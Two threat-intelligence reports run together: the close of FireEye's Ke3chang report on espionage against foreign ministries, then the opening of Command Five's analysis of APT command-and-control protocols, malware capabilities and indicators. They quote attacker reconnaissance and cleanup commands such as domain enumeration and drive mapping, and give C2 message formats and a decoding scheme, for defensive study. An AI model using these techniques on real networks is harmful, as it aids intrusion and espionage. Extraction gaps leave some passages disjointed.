Once a compromised system connects to the CnC server, the Ke3chang attackers follow a
predetermined script.They first gather information about the local computer and the network to
which it is connected.This step was done manually; we found several instances of typing errors,
such as the following:
  •	net group “[REDACTED]” /doamin
  •	net group /doamin

The attackers then listed information for specific users, focusing on users and groups suspected of
possessing advanced rights such as domain administrators and service accounts that have access
to a wide range of systems.Then they used the “net use” command to map network drives, including some that required a
password, as follows:

  •	net use \\[REDACTED] [REDACTED]:J: /user:[REDACTED]

In some cases, they appeared to try and move laterally by copying a file (always initially called
“msn.tmp”) to other machines on the network.They frequently changed the destination directory
and filename of the target file, presumably to make finding the malware more difficult for incident
responders upon initial discovery.*

They then checked the RAR archive, uploaded it to the CnC server, and deleted the archive from
the compromised system:

  •	dir %temp%/tem.rar
  •	del C:\DOCUME~1\[REDACTED]\[REDACTED]\Temp\tem.rar

During our window of visibility, FireEye found evidence that the attackers were able to enumerate the
various target networks, move laterally to compromise new systems, and finally to gather information
that was compressed and uploaded to the CnC server.However, FireEye lost visibility on this Ke3chang
CnC server before the attackers shifted to the major data exfiltration phase.Therefore, exploring competing
hypotheses is important, as is recognizing, and acknowledging areas of uncertainty.<fn>8</fn>
Moreover, “attribution” can have multiple meanings.Some use it to refer to an ultimate beneficiary,
such as a nation-state, while others use the term to refer to malware authors or CnC operators.<fn>9</fn>
During our investigation, FireEye focused on technical clues left by the malware authors and CnC
operators.Within the malware binaries themselves, linguistic clues point to the malware authors’
use of the Chinese language, as seen in Figure 17.<figure></figure>


                                                                                          <caption>Figure 17.PE resource containing
                                                                                          Chinese text present in BS2005 sample</caption>



<footnote>
     6	 Bejtlich, R. “Attribution Using 20 Characteristics “.January 2010.7	 Cloppert, M. “Defining APT Campaigns”.June 2010.Cloppert, M. “Attacking the Cyber Kill Chain”.October 2009.8	 Carr, J.“Mandiant APT1 Report Has Critical Analytic Flaws”.February 2013.9	   Clark, D. & Landau, S. “Untangling Attribution” in Proceedings of a Workshop on Deterring Cyberattacks:
     	    Informing Strategies and Developing Options for U.S. Policy.2010.Boebert, W. “A Survey of Challenges in Attribution” in Proceedings of a Workshop on Deterring Cyberattacks:
     	    Informing Strategies and Developing Options for U.S. Policy.2010.</footnote>


<footer>FireEye, Inc.     Operation “Ke3chang”: Targeted Attacks Against Ministries of Foreign Affairs	                                   20</footer>

In addition, the Ke3chang CnC control panel contains a mix of Chinese and English words and
characters.The subset of CnC servers that were not hosted by dynamic DNS infrastructure was
registered using a registrar in China (XIN NET) and the WHOIS records indicate that the registrant is in
China.The following email addresses were used to register those non-dynamic CnC domains:
•	 xiaoxiao_222@yahoo.com
•	 tk329@yahoo.com
•	 zsy@gmail.com

During our period of visibility into the BS2005 “moviestar” campaign against various ministries of
foreign affairs in Europe, FireEye discovered that the attackers had initially tested the malware in
virtual machines, prior to compromising actual targets.We retrieved the output of the commands the
attackers had run when testing the malware.The output indicates that the Ke3chang attackers are
testing their malware in Windows operating systems, with the default language set to Chinese.<figure></figure>

                                                                               <caption>Figure 18.Test CnC output generated by
                                                                               the Ke3chang actor after infecting their
                                                                               test endpoints with BS2005 malware</caption>




Based on this circumstantial evidence we believe that the Ke3chang attackers are operating within
China.But their exact identities and motivation remain unknown.</section>



<footer>FireEye, Inc.   Operation “Ke3chang”: Targeted Attacks Against Ministries of Foreign Affairs	                             21</footer>

<section>
<heading>    Conclusion</heading>
    Ministries of foreign affairs in Europe have been targeted and compromised by a threat actor we call
    Ke3chang.This attack used the crisis in Syria as a lure to deliver malware to its targets.The timing of the
    attack precedes the G20 meeting in Russia that focused on the crisis in Syria.Furthermore, FireEye has
    presented evidence indicating that the Ke3chang attackers have been active since at least 2010 and
    have attacked targets related to G20 meetings in the past.During our investigation, we were able to observe the inner workings of one of the CnC servers used by
    the attackers.As a result, we were able to identify some of the victims of the attack, as well as gather
    circumstantial evidence that indicates that the attackers may be operating from China.During our brief window of visibility into one of the known 22 CnC nodes, FireEye observed the attackers
    conducting reconnaissance and moving laterally throughout the compromised networks.Relevant
    authorities were immediately notified upon this discovery, and FireEye began its worldwide target
    notification process.At that time, FireEye did not observe the attackers exfiltrating sensitive data;
    however, we believe the Ke3chang attackers likely began attempting to exfiltrate sensitive data
    shortly thereafter.Accordingly, diplomatic missions, including ministries of foreign affairs, continue to be targeted by
    malware-based espionage campaigns.This report demonstrates that attackers are able to successfully penetrate government targets using
    exploits for vulnerabilities that have already been patched and despite the fact that these ministries
    have defenses in place.This illustrates the limitations of traditional defenses and highlights the need for
    security strategies that not only leverage advanced technologies designed to defend against targeted
    threats, but also the incorporation of threat intelligence and an incident response capability.To learn more about FireEye, visit www.FireEye.com.</section>


<section>
    <heading>About FireEye</heading>
    FireEye has invented a purpose-built, virtual machine-based security platform that provides real-
    time threat protection to enterprises and governments worldwide against the next generation of
    cyber attacks.These highly sophisticated cyber attacks easily circumvent traditional signature-based
    defenses, such as next-generation firewalls, IPS, anti-virus, and gateways.The FireEye Threat Prevention
    Platform provides real-time, dynamic threat protection without the use of signatures to protect an
    organization across the primary threat vectors, including mobile, Web, email, and files and across the
    different stages of an attack life cycle.The core of the FireEye platform is a virtual execution engine,
    complemented by dynamic threat intelligence, to identify and block cyber attacks in real time.FireEye
    has over 1,300 customers across more than 40 countries, including over 100 of the Fortune 500.</section>


<section>
© 2013 FireEye, Inc. All rights reserved.FireEye is a registered trademark of FireEye, Inc. All other brands, products, or service names
are or may be trademarks or service marks of their respective owners.– RPT.OK.EN-US.122013



FireEye, Inc. | 1440 McCarthy Blvd.Milpitas, CA 95035 | 408.321.6300 | 877.FIREEYE (347.3393) | info@FireEye.com | www.FireEye.com

</section>
</doc><doc>
<cover> 
<heading>Command and Control in the Fifth Domain</heading>
Command Five Pty Ltd
February 2012
</cover>

<section>
<heading>ABSTRACT</heading>

This paper presents the findings of an extensive investigation into command and control infrastructure used by an Advanced Persistent Threat.Findings include technical details of malicious software, and associated command and control protocols.These findings are drawn upon to identify modus operandi and demonstrate links between a number of major targeted attacks including the recent Sykipot attacks, the July 2011 SK Communications hack, the March 2011 RSA breach, and the series of coordinated cyber attacks dubbed NightDragon.</section>

<section>
<heading>WARNING</heading> 
 
This paper discusses malicious activity and identifies Internet Protocol (IP) addresses, domain names, and websites that may contain malicious content.For safety reasons these locations should not be accessed, scanned, probed, or otherwise interacted with unless their trustworthiness can be verified.</section>

<section>
<heading>BACKGROUND</heading> 
 
On 28 July 2011 SK Communications announced it had been the subject of a hack which resulted in the theft of the personal details of up to 35 million people <fn>1</fn> .The attackers infected a number of SK Communications computers with malicious software (malware) and, by issuing command and control (C2) instructions to the malware, were able to gain access to, and exfiltrate large quantities of data.The attack itself was complex, well planned and likely part of a broader, concerted hacking effort attributable to an Advanced Persistent Threat <fn>2</fn>.The malware used in the attack was programmed to communicate with several ‘callback’ domains.The malware located its C2 server(s) by resolving these domains into IP addresses using the ubiquitous Domain Name System (DNS) <fn>3</fn> protocol.These communications are depicted in Figure 1.<figure>
1.DNS server Computer 2. infected with malware 3.Command and 4. control (C2) server
1.Using the Domain  Name System (DNS) protocol, the computer asks a DNS server for directions to the callback domain.2.The DNS server advises that the callback domain is located at IP address x.x.x.x.3.The malware communicates with the C2 server located at IP address x.x.x.x to obtain C2 instructions and/or to send a response.4.The C2 server provides additional C2 instructions to the malware.<caption>FIGURE 1: DEPICTION OF COMMUNICATIONS</caption>
</figure>



<footnote> 
1 For details of the hack refer to the Command Five paper ‘SK Hack by an Advanced Persistent Threat’.(Command Five Pty Ltd, 2011) 

2 For a definition of the term ‘Advanced Persistent Threat’ refer to the Command Five paper ‘Advanced Persistent Threats: A Decade in Review’.(Command Five Pty Ltd, 2011) 

3 DNS is fundamental on the Internet.It is a form of directory assistance to help computers communicate with other computers.Its use is analogous to a person calling directory assistance to find out what phone number to dial to speak to a certain person.</footnote>

One of the callback locations used in the SK Communications hack was ‘update.alyac.org’.The domain was registered on 24 September 2010 using registration information almost identical to that of a legitimate company – a tactic used by the attacker on several occasions<fn>4</fn>.Following the intrusion into the SK Communications network it became widely known that the domain was being used for malicious purposes, and perhaps for this reason, the one year registration was not renewed by the attacker.Despite this, a number of victims around the world continued to use the domain to locate their C2 server, resulting in attempted communications to a C2 server that no longer exists.</section> 
 
<section> 
<heading>THE VICTIMS</heading> 
 
Computers using IP addresses allocated to France, the People’s Republic of China, Portugal, South Korea, Taiwan, the United Kingdom and the United States are among those that attempted to communicate with ‘alyac.org’ subdomains after the attacker’s registration lapsed in September 2011.While some of these computers belong to security researchers who deliberately installed malware for research purposes, most are victims compromised by the attacker either directly or indirectly.The victims are from a variety of industries including the technology sector, high precision manufacturing, research and development, testing and certification, global market research, executive headhunting and mentoring, and webhosting providers.</section>

<section>
<heading>THE COMMUNICATIONS</heading>

Eight different types of C2 communications were observed to ‘alyac.org’ subdomains from the compromised computers.These communication types will be referred to as ‘LURK’, ‘X­Shell C601’, ‘Update?’, ‘Murcy’, ‘Oscar’, ‘BB’, ‘DB’, and ‘Qdigit’ respectively.Several victims communicated via both ‘Update?’ and ‘Oscar’ which are believed to be associated with the same malware.No other victims were observed communicating with ‘alyac.org’ subdomains via more than one C2 protocol.</section>

<section> 
<heading>THE ‘LURK’ COMMUNICATIONS</heading>

A single computer was observed communicating with the callback domain ‘path.alyac.org’ on Transmission Control Protocol (TCP) 80 via the ‘LURK’ protocol.The communications contained a 15­byte header followed by data compressed using the DEFLATE <fn>5</fn> compression method.The header contained a protocol identifier, size and compression information as shown in Table 1.<table>

 BYTE SIZE (BYTES) DESCRIPTION*
 POSITION
 0 4 LURK protocol identifier.Hexadecimal bytes ‘0x4C 0x55 0x52
 0x4B’ (or “LURK” in ASCII
 representation).4 1 Hexadecimal byte ‘0x30’ (“0”) in all
 observed samples.Byte may form
 part of the protocol identifier.5 4 Sizec ­ Compressed message size in
 bytes (including header).9 4 Decompressed data size in bytes.13 2 ZLIB<fn>6</fn> stream header.Hexadecimal
 bytes ‘0x78 0x9c’<fn>7</fn> in all observed 
 communications, denoting that the
 DEFLATE compression method was
 used to compress the data (with a
 window size of 32K).15 [Sizec – 15] DEFLATE compressed data.* ALL VALUES ARE LITTLE­ENDIAN UNLESS OTHERWISE STATED.<caption>TABLE 1: LURK PROTOCOL FORMAT</caption>
</table>



The decompressed data reveals information about the compromised computer such as its name, computer specifications and operating system (OS) information as shown in Table 2.For example, it reveals that the compromised computer communicating with ‘path.alyac.org’ is running Windows 2003 Server Web Edition, Service Pack 2.<footnote> 
4 Other domains registered using a similar tactic include ‘bomuls.com’, ‘nprotects.org’, and ‘trendmicros.net’.(Command Five Pty Ltd, 2011) 

5 The DEFLATE compression method is specified in RFC 1951.(Deutsch, 1996)

6 ZLIB is a compressed data format scheme specified in RFC 1950.(Deutsch, ZLIB Compressed Data Format Specification version 3.3, 1996)

7 As described in Section 2.2 of RFC 1950, bits 0 to 3 in the first byte of the ZLIB stream header represent the compression method used, and bits 4 to 8 represent compression information.The second byte in the header contains bits for an integrity check, along with two additional flags.With a second byte of ‘9c’ the integrity check passes (as 30876 is divisible by 31), the preset dictionary flag is not set, and the compression level flag indicates that the default algorithm was used for compression.(Deutsch, ZLIB Compressed Data Format Specification version 3.3, 1996)
</footnote>


<table>
BYTE SIZE DESCRIPTION* 
POSITION (BYTES) 
0 4 Possible protocol identifier.Fixed bytes ‘0x82 
 0x69 0x74 0x6B’ in all observed 
 communications.4 260 ‘0x00’ bytes in all observed communications.264 1 ‘0xD0’ in all observed communications.265 31 Null­terminated computer name.296 24 ‘0x00’ bytes in all observed communications.320 156 OSVERSIONINFOEX<fn>8</fn> structure (format shown 
 in Annex A).476 9 Null­terminated account name.485 19 Unknown.504 4 Horizontal screen resolution (pixels).508 4 Vertical screen resolution (pixels).512 92 Unknown.604 4 Computer Processor Unit speed in megahertz
 (MHz).608 8 Null­terminated string containing amount of
 memory and unit of measurement (e.g.“1023MB”).616 120 Unknown.* ALL VALUES ARE LITTLE­ENDIAN UNLESS OTHERWISE STATED.<caption>TABLE 2: FORMAT OF DECODED LURK COMMUNICATIONS</caption> 
</table> 

 
 Similar communications <fn>9</fn> are known to be generated by malware that communicates with the callback domain ‘office.windowupdate.org’ – a domain that is linked to ‘alyac.org’ not only by the communications protocol but also by both domain registration tactic and infrastructure.The domain ‘windowupdate.org’ is ostensibly registered to ‘Microsoft Corporation’.The administrative address and contact information listed in the domain registration is identical to that listed for the legitimate Microsoft domain ‘windowsupdate.com’<fn>10</fn>.This is the same tactic used by the attacker with registration of ‘alyac.org’ <fn>11</fn>.The domain ‘windowupdate.org’ previously pointed to South Korean IP address 222.122.20.241­ an IP address to which ‘alyac.org’ also previously pointed.This shared infrastructure further suggests that the observed communications to ‘path.alyac.org’ and those to ‘office.windowupdate.org’ may be linked to the same attacker.The malware that generates the LURK communications sent to ‘office.windowupdate.org’ was signed using a compromised code signing certificate belonging to YNK Japan Inc – a producer of online games.The same certificate has been used in a number of attacks including by Hupigon malware <fn>12</fn> and malware similar to that used in the SK Communications hack.Details of the compromised code signing certificate are shown in Figure 2.(Fagerland, 2011)

 The date of effect of the revocation has since been backdated to prevent this malware’s certificate from validating<fn>14</fn>.The new date of effect still may not prevent the validation of all malware using this compromised code signing certificate.</section>

<footnote> 
8 The OSVERSIONINFOEX system information structure includes  major and minor version numbers, a build number, platform identifier and information about product suites and the latest Service Pack installed.(Microsoft Corporation, 2011) 

9 The malware ‘Troj/Agent­UDR’ with MD5 hash ‘4237 7E72 4875 2912 5EBE 7C95 02B9 4CD7’ is known to generate communications of the format ‘LURK0\xAC\x01’, ’LURK0\xAD\x01’, ‘LURK0\B3\x01’ and ‘LURK0\xB5\x01’.(Sophos Ltd., 2011) 

10 The legitimate domain ‘windowsupdate.com’ is used by Microsoft to deliver updates to the Windows OS.11 The domain ‘alyac.org’ was registered using registration details that made the domain appear as though it was associated with the legitimate, trusted entity ESTsoft – the producer of ALYac antivirus software.(Command Five Pty Ltd, 2011) 

12 Hupigon is a remote administration tool from China.It has rootkit functionality, can log user activity and establishes outbound communications to a C2 server.(F­Secure Corporation)

13 The revocation is active from the ‘revocationDate’ (in this case, 29 July 2011) specified in the Certificate Revocation List.14 The revocation for the compromised code signing certificate has been backdated to 12 April 2010 so that the earliest known malware signed with it no longer validates.(Verisign, 2011) 
</footnote>

<section>
<heading>THE ‘X­SHELL C601’ COMMUNICATIONS </heading>
 
Numerous compromised computers communicated with ‘path.alyac.org’ on TCP port 443 ­a port commonly used for SSL.These communications, however, were not SSL but instead unencrypted communications likely generated by a version of the command­line based ‘X­Shell 601’ Remote Administration Tool (RAT) <fn>15</fn>.A summary of the observed X­Shell communications, and the information they reveal about the compromised computer, is shown in Table 3.The ‘C’ immediately preceding the ‘601’ in the communications is believed to indicate that the malware is not a free version but instead a custom, or commercial, version of the X­Shell 601 RAT.<table> 
 BYTE SIZE DESCRIPTION* 
 POSITION (BYTES)
 
 0 8 ‘0x00’ bytes in all observed samples.8 4 Tick count (number of milliseconds 
 since system was started – resets after
 49.7 days).12 4 ‘0x00’ bytes in all observed samples.16 4 Protocol identifier – ’0x43 0x36 0x30 
 0x31’ (“C601”).20 28 Null­terminated username (if 
 successfully obtained from the system).48 156 OSVERSIONINFOEX structure (format 
 shown in Annex A).204 52 Unknown.256 32 Null­terminated computer name (if 
 successfully obtained from the system).288 12 Process name.300 52 ‘0x00’ bytes in all observed 
 
 communications.352 36 SYSTEM_INFO<fn>16</fn> structure (format
 shown in Annex B).388 72 ‘0x00’ bytes in all observed samples.460 12 Unknown.472 4 Locale identifier<fn>17</fn>.476 4 Tick count (repeated).480 300 Unknown.Mainly ’0x00’ bytes in 
 observed communications.* ALL VALUES ARE LITTLE­ENDIAN UNLESS OTHERWISE STATED.</table>

<caption>TABLE 3: X­SHELL C601 COMMUNICATION FORMAT </caption> 
 
 In all observed communications the process name listed at byte 288 was ‘svchost.exe’ <fn>18</fn>.Based on this, the malware has likely modified the system registry on the compromised computers in such a way that the RAT gets executed as a service by the trusted process ‘svchost.exe’ each time the computer is started.This process name, along with the callback location, is configurable, and can be configured after the RAT has been compiled into executable form.While X­Shell supports numerous versions of the  Windows OS (including Windows XP, Vista, Windows 7, and Windows 2000, 2003 and 2008 server ­ both  32 and 64 bit versions), only computers running Windows XP were observed communicating with ‘path.alyac.org’.The functionality of the RAT depends on the version, release number, plugins installed and the OS on which the RAT is installed <fn>19</fn>.Several versions of the X­Shell RAT exist, including a free version and a  ‘spy’ version<fn>20</fn>.The free version of the RAT is no longer available for download from the XDoors website, however, development of the software continues<fn>21</fn>.Current release numbers of the X­Shell RAT include 601 and 603.Previous releases date back to at least 2006<fn>22</fn>.Some functionality comes standard in all versions of the RAT including the ability to start a command shell, control processes and services, upload/download files, terminate TCP connections, create user accounts, retrieve system information, log user activity (via a keylogger) , modify timestamps on files, conduct process injection, conduct denial of service attacks and shutdown or restart the computer.Commands supported by the X­Shell software are listed in Annex C. (XTiger) 

<footnote>
15 The X­Shell RAT is commercial software.(XTiger, Xdoors.net, 2011) 

16 The SYSTEM_INFO structure contains information about a computer such as its architecture, type of processor and number of processors used.(Microsoft Corporation, 2011) 

17 A locale is a collection of language­related user preference information that typically identifies a user’s country and dialect.(Microsoft Corporation, 2011) 

18 The process ‘svchost.exe’ is a generic host process for services which run from DLLs.(Microsoft, A description of Svchost.exe in Windows XP Professional Edition 2007)

19 Not all features are supported in each OS.For example, raw socket sniffing is only supported in Windows 2000 and 2003.(XTiger)

20 Versions of X­Shell include a ‘personal’ edition, a ‘mini’ version, an ‘advanced’ version, a ‘spy’ version and an ‘enterprise’ version.(XTiger ­ Crackersoftware, 2011)

21 Due to the author wanting to avoid “unnecessary trouble”, as of 16 March 2011, the free version of the X­Shell RAT (and also its sister product the X­Door RAT) is no longer available for download from the ‘xdoors.net’ webpage, however, an online forum containing a list of changes made to the RAT continues to be updated.(XTiger, forum.xdoors.net.Topic: X­Door/X­Shell free
download paused, 2011)

22 Previous releases of X­Shell include release numbers 323, 325, 327, 329, 331, 333, 335 and 337.(XTiger, 2010)
</footnote>

The RAT is Virtual Machine (VM) aware, proxy aware and can also use a specified DNS server to resolve callback domains.Some versions have rootkit functionality and can avoid detection by antivirus software.Third­party plugins can be developed and integrated into the product.Optional features include encrypted file search, an SMS notification service, and functionality that enables the compromised computer to be used as part of a botnet to send spam or to conduct distributed denial of service attacks.This broad range of functionality makes the software fit for a number of purposes and reflects the commercial nature of the software.(XTiger) 
 
 The X­Shell RAT is generated by the X­Shell Control Program ­ the same program from which the malware is controlled.The control program can be run in either Chinese language mode or English language mode, and allows the malware to be easily configured.It provides options to digitally sign the malware, specify its connection mode (connect/listen/sniff), install the malware in one of several covert manners, recover the System Service Dispatch Table (SSDT) <fn>23</fn> before installation, and abort installation if a virtual machine is detected.(XTiger)
 
 When X­Shell malware is generated, and the ‘connect’ connection mode <fn>24</fn> selected, the malware is configured with a static C2 host (IP address or callback domain) and control port.Additionally, an option can be selected during the generation process to actively notify the malware of a new C2 host and port via a configuration webpage <fn>25</fn>.If this option is selected, the malware communicates with both a configuration webpage, and a C2 server at regular intervals.The interval for each can be separately configured to a value of between 30 and 3600 seconds (inclusive).(XTiger) 
 
 The X­Shell RATs that communicated with the C2 host ‘path.alyac.org’ had been configured to use a 36 second interval.It is not known whether the malware was configured solely with a static C2 host or whether the malware also retrieves its C2 host and port from a configuration webpage.</section>

<section>
<heading>X­Shell Configuration Webpages</heading>
X­Shell configuration webpages contain, in encoded form, a colon­separated IP address (or callback domain) and port for the malware to use to communicate with its C2 server.The encoded IP address (or callback domain) and control port can be decoded one byte at a time using the formula:
<code>
 di = ei – ((i%8)+x),
</code> 
where i is the byte index, di is the decoded byte, ei is the encoded byte and x is a one byte key.This is the equivalent of subtracting both the key and the byte position number [0­7] from each byte.The position number is modulo 8 i.e.repeats every 8 bytes.For example, if the compromised computers received a C2 host of ‘PATH.ALYAC.ORG’ and a control port of 443 from a configuration webpage, and a key of 0x16 (22 in decimal) was used to encode the control information, the configuration webpage would have contained the encoded string ‘fXlaH\hvWZFhlbVQJJ’.</section>

<section>
<heading>THE ‘UPDATE?’ COMMUNICATIONS</heading>
HyperText Transfer Protocol (HTTP) POST ‘Update?’ requests were sent to both ‘path.alyac.org’ and  ‘update.alyac.org’ from compromised computers.Two request formats were observed; Variant A (shown in Figure 3) in which the file path requested  was ‘/update?product=windows’, and Variant B (shown in Figure 4) in which the file path requested  was ‘/update?id=number’, where number refers to an eight digit hexadecimal number that changes between requests.The domain ‘path.alyac.org’ only received Variant B requests, while both variants were sent to ‘update.alyac.org’.<footnote>
23 The SSDT is often used by kernel mode rootkits to evade detection.24 In the ‘connect’ mode the malware attempts to communicate with its C2 server, as opposed to the ‘listen’ mode in which it waits for a C2 server to attempt to connect to it.25 The configuration webpage is often named ‘xcip.asp’ and can be generated and uploaded from within the control program.‘Xcip’ is presumably an acronym for ‘X­door Configure IP address’ or something similar.The format of Variant B is identical to the communications generated by malware that uses the callback domain ‘gm1.network­sec.net’<fn>27</fn>.Both variants are associated with the Destory RAT family of malware that dates back at least as far as January 2007<fn>28</fn> and has been used in several major targeted attacks.The Destory RAT family includes malware that is detected as: Backdoor.Sogu, Backdoor:Win32/Thoper.A <fn>29</fn>, Trojan.Downloader:Win32/Thoper B <fn>30</fn>.The observed communications to the ‘alyac.org’ subdomains all occurred on TCP port 80, however, a variety of ports (TCP ports 8080, 443, 12345 etc.)have been used by this particular family of malware for similar requests.The port used depends on how the malware is configured.Connection attempts from each of the compromised computers occurred frequently while the computers were powered on.For example, one computer connected at 16 second intervals and another approximately every 200 seconds (±15 seconds).Three HTTP POST requests were submitted during each connection, each approximately one second apart.The following malformed user­agent<fn>31</fn> is present in the HTTP POST requests of both variants (spaces shown here as ‘·’): ‘Mozilla/4.0·(compatible;·MSIE·6.0;·Windows·NT·5.1;SV1;’

 This user­agent is consistent with that which may be generated by version 6.0 of the Microsoft Internet Explorer web browser running on the Microsoft Windows XP OS, except that it is missing a closing bracket after the last semicolon and a space after the second to last semicolon.This malformed user­agent is hardcoded into the malware and can be used as a signature to detect the communications.Four custom headers are also present in the HTTP requests: ‘X­Session’, ‘X­Status’, ‘X­Size’, and ‘X­Sn’.For some malware in the Destory RAT family not all of these headers will be present.</section>
 
<footnote> 
26 For a detailed analysis of the Destory RAT used in the SK Communications hack (including a complete list of deobfuscated strings) refer to the Command Five paper ‘SK Hack by an Advanced Persistent Threat’.(Command Five Pty Ltd, 2011) 

27 Malware detected as ‘Troj_Inject.AMR’ submits HTTP POST requests to ‘gm1.network­sec.net/update?id={value}’.The domain ‘gm1.network­sec.net’ is a known callback of malware detected as Backdoor:Win32/Thoper.A.(Mendoza, 2011) (Wong, 2011) 

28 The Destory RAT with MD5 hash ‘70CD C9A2 D9CC 276B C5D1 D47D 21FB 24DF‘ was compiled on 3 January 2007.29 The Destory RAT with MD5 hash ‘5FCE 1FC1 8283 D76C 396A 3CCC 64BD BBDE’ is detected by antivirus software as both Backdoor.Sogu and Backdoor:Win32/Thoper.A.This malicious file is identical to that used in the SK Communications hack except forits configuration.(Hispasec Sistemas, 2011)

30 The Destory RAT with MD5 hash ‘7543 64D9 DB70 2DC7 1532 7B40 BF97 E556’ is detected by antivirus software as both Backdoor.Sogu and TrojanDownloader:Win32/Thoper.B.(Hispasec Sistemas, 2011)

31 User­agents are used in HTTP communications to tell webservers which OS and web browser their clients are using, so they can serve compatible webpages.</footnote>

<section>
<heading>Cookie Stealing</heading> 
 
Cookies were sent with the HTTP POST requests from all but three IP addresses.A cookie named ‘VistorID’ was present any time a cookie was sent.On occasion a ‘Yahoo’, ‘SessionId’ and/or ‘fcVal’ cookie was also present in the requests.The transmission of these cookies could facilitate session stealing and, in the case of the Yahoo cookie, enable unauthorised webmail access.Each VisitorID cookie contained an expiry time between 9/25/2014 5:50:03 AM and 9/25/2014 6:14:17 AM.The expiry time is unique for each victim and remained constant (per victim) across the HTTP POST requests.It is possible the victims received the cookie from a C2 server with which they had previously communicated, or, from a server hosting a webpage that caused the initial infection.It is also 
 
possible that the cookie, and the propinquity of the times in the cookies, is coincidental, and that the victims received the cookie from other locations.</section>

<section> 
<heading>THE ‘MURCY’ COMMUNICATIONS</heading>
 
Multiple Chinese IP addresses were observed submitting HTTP GET requests to the host ‘path.alyac.org’.Data contained within the communications indicated that the requests were all sent from a single computer, and therefore that computer was not using a static IP address.The data from the computer was carried in the requests in an encoded form (as described below) within a HTTP header named ‘Extra­Data’.Two other unique headers were also present in the requests; ‘Extra­Data­Bind’ and ‘Extra­Data­Space’.The communications appear to be generated by malware known as ‘Backdoor.Murcy’ that is reportedly not in widespread use<fn>32</fn>.An example of an actual HTTP GET request is shown in Figure 5.the number of milliseconds since the system was started).The requests from the victim occurred approximately every 11 seconds when the computer was turned on.Accordingly, the number in the URI increased by approximately 11000 each request.Where there was a break in the communications (presumably due to the computer being shut down or rebooted), the counter reset and was between 128703 and 133243 in the next communication.This indicates that the malware began communicating from this compromised computer within minutes of the computer being booted.The encoded data within the ‘Extra­Data’ header can be decoded using the standard Base64 alphabet but with modified bit placement.The standard Base64 algorithm decodes encoded strings using consecutive bits read left to right i.e.bits 0­7 would form the first decoded byte (shown in Figure 6).For Murcy communications, the input bits that form each output byte are not taken contiguously.Figure 7 describes how the first three decoded bytes are constructed, and can be used to implement a decoding algorithm.<footnote> 
32 Symantec Corporation assesses the number of Backdoor.Murcy infections to be less than 50.</section>

 <section> 
 <heading>IP2B Protocol</heading>
 
 The decoded string contains communications of a format hereon referred to as the ‘IP2B’ protocol.All observed IP2B communications began with a 16 byte header containing the hexadecimal values 0x12345678 and 0x10001000, and the size of the data.The decoded version of the Murcy ‘Extra­Data’ string from Figure 5 is shown in Figure 8.<figure> 
 78 56 34 12 00 10 00 10 DA 00 DA 00 ; xV4.........
 00 00 00 00 18 09 07 20 C0 A8 84 82 ; ....... .... 
 C0 A8 84 82 F0 FD 07 00 54 0D 00 00 ; ........T... 
 80 07 00 00 38 04 00 00 04 08 00 00 ; ....8.......
 
 2C 4D 02 00 05 00 00 00 01 00 00 00 ; ,M..........
 28 0A 00 00 02 00 00 00 4C 00 00 00 ; (.......L... 
 8A 00 00 00 A8 00 00 00 AA 00 00 00 ; ............ 
 B8 00 00 00 D8 00 00 00 38 00 33 00 ; ........8.3.37 00 42 00 xx xx xx xx xx xx xx xx ; 7.B.xxxxxxxx
 
 xx xx xx xx xx xx xx xx xx xx xx xx ; xxxxxxxxxxxx
 
 xx xx xx xx xx xx xx xx xx xx xx xx ; xxxxxxxxxxxx
 xx xx xx xx xx xx xx xx xx xx xx xx ; xxxxxxxxxxxx 
 xx xx 36 00 39 00 31 00 00 00 53 00 ; xx6.9.1...S. 
 65 00 72 00 76 00 69 00 63 00 65 00 ; e.r.v.i.c.e.20 00 50 00 61 00 63 00 6B 00 20 00 ; .P.a.c.k..33 00 00 00 00 00 53 00 59 00 53 00 ; 3.....S.Y.S.54 00 45 00 4D 00 00 00 57 00 4F 00 ; T.E.M...W.O.57 00 2D 00 45 00 38 00 45 00 xx xx ; W.-.E.8.E.xx
 xx xx xx xx xx xx xx xx xx xx xx xx ; xxxxxxxxxxxx 
 36 00 00 00 00 00 ; 6..... 
 <caption>FIGURE 8: EXAMPLE OF DECODED MURCY DATA STRING</caption> 
</figure>

 The decoded data reveals the name of the compromised computer, that the computer is running Windows XP Service Pack 3, its internal IP address is 192.168.132.30, its screen resolution is set to 1920x1080 and that its locale<fn>33</fn> is ‘Chinese ­ China’.A summary of each byte in the observed communications is provided in Table 4.<table>
BYTE POSITION SIZE DESCRIPTION*
 (BYTES)
0 4 Protocol identifier.‘0x12345678’ in
 all observed communications.4 4 Hexadecimal value 0x10001000 in
 all observed communications.8 2 Data size in bytes (excluding 
 header).10 2 Data size in bytes (excluding 
 header).12 4 ‘0x00’ in all observed
 communications.16 4 ’0x18 0x09 0x07 0x20’ in all
 observed communications.20 4 IP address.Value is big­endian.24 4 IP address.Value is big­endian.28 4 Unknown.32 4 Unknown.36 4 Horizontal screen resolution
 (pixels).40 4 Vertical screen resolution (pixels).44 4 Locale identifier<fn>34</fn>.48 4 Tick count.Value is identical to that
 present in the URI within the Murcy
 HTTP GET requests.52 4 OS major version.56 4 OS minor version.60 4 OS build number.64 4 Platform ID.68 24 Unknown.92 SizeIdent Ident­ A null terminated 2­byte wide
 character identifier string.[92 + SizeIdent] SizeSPack SPack ­ A null­terminated 2­byte
 wide character string indicating the
 latest Service Pack installed.[92 + SizeIdent + SizeUName UName ­ A null terminated 2­byte
SizeSPack] wide character username.[92 + SizeIdent + SizeCName CName – A null­terminated 2­byte
SizeSPack + wide Unicode character computer
SizeCName] name.* ALL VALUES ARE LITTLE­ENDIAN UNLESS OTHERWISE STATED.<caption>TABLE 4: IP2B PROTOCOL FORMAT</caption>
</table>


<footnote> 
33 A locale is a collection of language­related user preference information that typically identifies a user’s country and dialect.(Microsoft Corporation, 2011)

34 For a list of locale identifiers refer to the Microsoft MSDN reference page.(Microsoft Corporation, 2011)
</footnote>

The data sent to the C2 server is dependent on the C2 instructions received.Commands the Murcy malware reportedly understands are shown in Annex D. (SafeZoneCast, 2011) 
 
